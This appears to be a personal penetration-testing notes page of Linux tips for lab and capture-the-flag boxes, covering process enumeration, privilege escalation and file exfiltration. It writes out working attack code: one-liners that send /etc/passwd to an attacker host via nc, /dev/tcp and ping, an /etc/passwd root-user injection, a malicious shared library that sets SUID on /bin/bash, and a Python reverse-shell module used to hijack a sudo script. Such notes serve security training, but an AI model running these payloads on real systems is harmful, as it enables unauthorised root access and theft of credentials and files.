# Linux Tips

# Enumerating Services Locally

View processes run by `root`:

```abap
ps -u root
ps fauxwww # list everything with users who run them
```

> ps -e or ps -A displays active Linux processes in the generic UNIX format. ps -T prints active processes that are executed from the terminal. Ps -C process_name will filter the list by the process name.
> 

[https://www.hostinger.com/tutorials/vps/how-to-manage-processes-in-linux-using-command-line](https://www.hostinger.com/tutorials/vps/how-to-manage-processes-in-linux-using-command-line)

- *******************Tip: if you find a process being run as a user with higher privileges than you, Google “[PROCESS NAME] Local Privilege Escalation”*******************

E.g. You find an SUID for Serv-U and google it to find a privesc ([from this box](https://resources.infosecinstitute.com/topic/election-1-vulnhub-ctf-walkthrough/))

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled.png)

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%201.png)

## PID of an Open Port

This finds the PID of port 80

```abap
fuser 80/tcp
```

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%202.png)

## Pause a Process

First, Ctrl+Z in the terminal window/tab where the process is running (it won’t show up from another shell session).

This example pauses and starts feroxbuster

```abap
└─# ps                      
    PID TTY          TIME CMD
 266474 pts/6    00:00:03 zsh
 267874 pts/6    00:02:56 feroxbuster

# pause
└─# kill -STOP 267874 

# resume
└─# kill -CONT 267874
```

### Find Port that is running on a given PID.

You have the user running the process and the process ID, but would like to verify the port.

```abap
ss -l -p -n | grep "pid=1234,"
lsof -Pan -p PID -i
netstat -ltnup
sudo lsof -i :80
```

### Find Useful Directories

Sometimes, you can find valuable backup files in another directory with the same name. For instance, `gitlab` can be in `/var/opt/gitlab` or `/opt/gitlab`. Look for those other files related to running services.

```jsx
find / -name gitlab -type d 2>/dev/null
```

## Check backup files

Always take a peek in `/var/backups` to check for backup files. They sometimes contain sensitive information such as passwords or keys.

## Searching FTP config files

If the host is running FTP  (especially if you weren’t able to access it until you gained your initial foothold), there is a chance it is related to the privilege escalation. 

### ProFTPd

Look at the config file at `/etc/proftpd/sql.conf`.

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%203.png)

```jsx
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password
```

As you can see, the password is listed under `SQLConnectInfo`. In this case, I can use these creds to connect to MySQL on the host.

# Directory enum

If you’re unable to find directories in `ffuf` but you can access them in the browser, make sure the `Accept:` header is set correctly.

```abap
ffuf -H 'Cookie: token=guest' -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -u http://imcool.htb/FUZZ
```

# Blind Code Execution

Can get output by executing:

```abap
$(nc {ATTACKER_IP} 8000 < /etc/passwd) # method 1
cat /etc/passwd > /dev/tcp/{ATTACKER_IP}/8000 #method 2
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done #method 3

```

The above code will send the contents of `/etc/passwd` to you `nc`listener.

# SSH

## Options for Old Host

```abap
ssh -oStrictHostKeyChecking=no -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group-exchange-sha1 -oUserKnownHostsFile=/dev/null -i ./id_rsa bob@10.11.1.136 -v
```

## Permissions for SSH files

```abap
chmod 700 .ssh
chmod 644 .ssh/authorized_keys
chmod 600 id_rsa
```

# Text Manipulation

Changing the case (lowercase and uppercase)

```abap
echo 31108E5848D8397C4D65E6D95CC8AAE9 | tr [:upper:] [:lower:] # to lowercase
echo 31108e5848d8397c4d65e6d95cc8aae9 | tr [:lower:] [:upper:] # to uppercase

```

### Find Writeable Files

Can find writeable files in Linux

```abap
find / -writable -ls 2>/dev/null
```

# TTYs

If your terminal looks weird like this, all you have to do to fix it is `bash -i`. It will give you an interactive bash shell.

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%204.png)

Idk what this is here, but I got it after a bind shell in ClamAV where the commands in the perl script were this

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%205.png)

# Write to /etc/passwd

If you have write access to `/etc/passwd`, you can add your own user with root privileges.

```abap
$ openssl passwd -1 -salt virusspec pass123 # note: must use your username as the salt
$1$virusspe$4YouPJf89m7D8Nk48Qvjn.
$ echo 'virusspec:$1$virusspe$4YouPJf89m7D8Nk48Qvjn.:0:0:root:/root:/bin/bash' >> /etc/passwd
```

# List shared libraries

### Cronjobs that are running a binary

```jsx
$ ldd /usr/bin/log-sweeper
linux-vdso.so.1 =>  (0x00007ffffffed000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f2025bbc000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f2025f8a000)

```

If a cronjob is running, you might be able to see what path it runs in `/var/spool/anacron`. If you have write access to one of them, you can insert

```jsx
/var/spool/anacron:
total 4
drwxr-xr-x. 2 root root 63 Sep  4  2020 .
drwxr-xr-x. 8 root root 87 Sep  4  2020 ..
-rw-------. 1 root root  9 Sep  4  2020 cron.daily
-rw-------. 1 root root  0 Sep  4  2020 cron.monthly
-rw-------. 1 root root  0 Sep  4  2020 cron.weekly
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""
```

In this case, `LD_LIBRARY_PATH` Is where the libraries in the binary are loaded from.

So to exploit this, I created a replacement for the missing library `[utils.so](http://utils.so)` in the directory I could write in `/usr/local/lib/dev`.  The contents of C file to escalate my privileges were as follows:

```jsx
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack(){
	setresuid(0,0,0);
	system("chmod +s /bin/bash");
}

// compile this exploit with following command
// gcc -o utils.so -shared -fPIC exploit.c
```

It worked!

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%206.png)

An alternative is this

```jsx
// Linux 2.6.18 SUID ROOT Exploit
int main(void) {
       setgid(0); setuid(0);
       execl("/bin/sh","sh",0); }
```

## Default FTP File location

The default FTP root directory location is `/var/ftp/`. So if the ftp showed a file called `test.txt` when you connect, it would be `/var/ftp/test.txt` in the server.

# SSH keygen one-liner

```nasm
ssh-keygen -t rsa -N '' -f ./id_rsa
```

## PHP Alternative execution

These are additional functions to execute shellcode in PHP

```jsx
system(); exec(); passthru(); shell_exec();
```

## Python Import Module Sudo

If you have the ability to execute a python script as sudo and it imports a module, try creating your own module in the same working directory as the script. If you have write access to do this, you can get a reverse shell. How to make the module can be found in this article:

[How does the import module work in Python 🐍](https://pythonprogramming.org/how-does-the-import-module-work-in-python/)

For instance, I had sudo to execute this script

![Untitled](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/Untitled%207.png)

It imports wificontroller.py. I created my own version that calls a reverse shell like this:

```bash
└─# cat wificontroller.py
import socket,subprocess,os

def reset(x, y):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.49.223",22))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```

and placed it in `/home/walter`. It was called when I ran sudo.

[PE Notes](Linux%20Tips%200ac4056c2acc4d4fab0a79667bee9186/PE%20Notes%206193480baeac46fc90b7a4b7d253366a.md)